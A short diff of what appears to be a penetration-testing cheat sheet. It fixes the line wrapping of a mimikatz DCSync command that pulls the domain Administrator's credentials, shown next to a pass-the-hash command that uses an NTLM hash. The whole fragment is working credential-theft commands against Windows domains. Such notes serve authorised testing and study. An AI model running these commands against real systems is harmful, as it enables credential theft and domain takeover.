@@ -46,8 +46,7 @@ mimikatz.exe privilege::debug "sekurlsa::pth /user:<username> /rc4:<NTLM hash> /
 # 2. After that, we canuse cmd.exe to execute commands in the user's context. 
 
 # Run a dcsync attack:
-.\mimikatz.exe privilege::debug "lsadump::dcsync
-/domain:$domain /user:Administrator" exit
+.\mimikatz.exe privilege::debug "lsadump::dcsync /domain:$domain /user:Administrator" exit
 ```
 
 
